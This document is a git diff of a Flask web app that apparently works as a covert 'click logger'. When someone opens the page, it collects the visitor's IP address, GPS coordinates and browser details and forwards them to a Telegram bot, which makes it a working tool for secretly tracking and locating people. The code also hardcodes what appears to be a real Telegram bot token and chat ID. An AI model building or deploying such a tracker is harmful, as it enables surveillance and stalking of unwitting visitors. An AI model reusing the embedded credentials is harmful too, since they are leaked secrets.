@@ -1,54 +1,50 @@
-from flask import Flask, render_template, request
+from flask import Flask, request, render_template
 import requests
 import datetime
+import pytz
+import os
 
 app = Flask(__name__)
 
-# Your Telegram Bot Setup
+# Telegram bot config
 BOT_TOKEN = '7638665325:AAEnpRe7ZTHK7VIfyVlM7lfPq9yBpcbhVzo'
 CHAT_ID = '6690693429'
 
-def send_telegram_alert(message):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": message}
-    requests.post(url, data=data)
-
-@app.route('/')
+@app.route("/", methods=["GET", "POST"])
 def home():
-    return render_template('index.html')
+    if request.method == "POST":
+        try:
+            data = request.get_json()
+            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            user_agent = request.headers.get('User-Agent')
+            latitude = data.get('latitude', 'N/A')
+            longitude = data.get('longitude', 'N/A')
 
-@app.route('/log', methods=['POST'])
-def log():
-    data = request.json
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            now = datetime.datetime.now(pytz.timezone("Asia/Kolkata"))
+            current_time = now.strftime("%d-%b-%Y %I:%M %p")
 
-    # Get IP info
-    ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
-    loc = ip_info.get("city", "") + ", " + ip_info.get("region", "") + " (" + ip_info.get("country", "") + ")"
-    isp = ip_info.get("org", "")
-    latitude = data.get('latitude', 'N/A')
-    longitude = data.get('longitude', 'N/A')
-    
-    # Get Time
-    time = datetime.datetime.now().strftime("%d-%b-%Y %I:%M %p")
-
-    msg = f"""
+            message = f"""
 📥 New Click Logged!
 
 🌐 IP: {ip}
-🌎 Location: {loc}
-📡 ISP: {isp}
-f"📍 Coordinates: {latitude}, {longitude}"
-
-📱 Device: {data.get('device')}
-🧠 Browser: {data.get('browser')}
-📏 Screen: {data.get('screen')}
-🔋 Battery: {data.get('battery')}
-🗣 Language: {data.get('lang')}
-🕒 Timezone: {data.get('timezone')}
-🔗 Referrer: {data.get('ref')}
-
-⏱ Time: {time}
+📍 Coordinates: {latitude}, {longitude}
+🧠 Browser: {user_agent}
+🕒 Time: {current_time}
 """
-    send_telegram_alert(msg)
-    return {"status": "logged"}
+            # Send to Telegram
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            payload = {
+                "chat_id": CHAT_ID,
+                "text": message
+            }
+            requests.post(url, data=payload)
+
+        except Exception as e:
+            print("Error:", e)
+
+        return "OK"
+
+    return render_template("index.html")
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
